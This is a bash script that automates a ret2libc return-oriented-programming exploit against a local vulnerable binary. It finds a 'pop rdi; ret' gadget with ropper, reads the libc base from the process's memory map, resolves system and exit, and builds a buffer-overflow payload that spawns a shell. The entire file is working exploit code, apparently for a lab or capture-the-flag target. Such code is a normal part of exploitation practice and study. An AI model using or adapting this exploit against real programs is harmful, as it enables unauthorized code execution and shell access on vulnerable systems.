#!/usr/bin/env bash

usage () {
	echo "usage: [DEBUG=1] [small_buffer=1] [command=/bin/sh] [gadget_offset=c0ffee] [libc_path=/path/to/libc.so.6] $0 <binary name>"
}

print_pointer () {
	printf '%016x\n' $1
}

# convert big endian to little endian
be2le () {
	echo -n $1 | tac -rs..
}

[[ $# != 1 ]] && usage && exit 1
[[ ! -x $1 ]] && usage && exit 2
command -v ropper || { echo 'Ropper is not installed.'; exit 3; }

[[ $command ]] || command='/bin/sh'
[[ $libc_path ]] || libc_path=$(find / -name 'libc.so.6' 2>/dev/null)
[[ $gadget_offset ]] || gadget_offset=$(ropper -f $libc_path --instructions "pop rdi; ret" --nocolor 2>/dev/null | grep -oPm1 '0x\K[\da-f]+')

buffer_address=$(print_pointer $(echo | ./$1 | head -n1))
cat | ./$1 > /dev/null &
libc_base_address=$(print_pointer 0x$(grep -m1 libc- /proc/$(pidof $1)/maps | cut -d'-' -f1))
kill $(pidof $1)
libc_system_offset=$(nm -D $libc_path | grep "\<system\>" | cut -d' ' -f1)
libc_exit_offset=$(nm -D $libc_path | grep "\<exit\>" | cut -d' ' -f1)
command_offset=$(print_pointer 0x$(strings -tx $libc_path | grep -oP "[\da-f]+(?= $command)"))

libc_system_address=$(print_pointer $((0x$libc_base_address + 0x$libc_system_offset)))
libc_exit_address=$(print_pointer $((0x$libc_base_address + 0x$libc_exit_offset)))
gadget_address=$(print_pointer $((0x$libc_base_address + 0x$gadget_offset)))
command_address=$(print_pointer $((0x$libc_base_address + 0x$command_offset)))

[[ $small_buffer ]] && padding=24 # = (4 + 8) * 2
[[ $small_buffer ]] || padding=$(((256 - ${#command} + 8) * 2))

if [[ $DEBUG ]]; then
	echo "Buffer address: $buffer_address"
	echo "Libc base address: $libc_base_address"
	echo "Libc system offset: $libc_system_offset"
	echo "Libc system address: $libc_system_address"
	echo "Libc exit offset: $libc_exit_offset"
	echo "Libc exit address: $libc_exit_address"
	echo "Libc command offset: $command_offset"
	echo "Libc command address: $command_address"
	echo "Gadget offset: $gadget_offset"
	echo "Gadget address: $gadget_address"
	echo "Padding: $padding bytes"
fi | column -t -s:

[[ $small_buffer ]] || payload+=$(echo -n $command | xxd -p)
payload+=$(printf "%0${padding}d" 0)
payload+=$(be2le $gadget_address)
[[ $small_buffer ]] && payload+=$(be2le $command_address)
[[ $small_buffer ]] || payload+=$(be2le $buffer_address)
payload+=$(be2le $libc_system_address)
payload+=$(be2le $libc_exit_address)

(echo -n $payload | xxd -r -p; cat) | ./$1
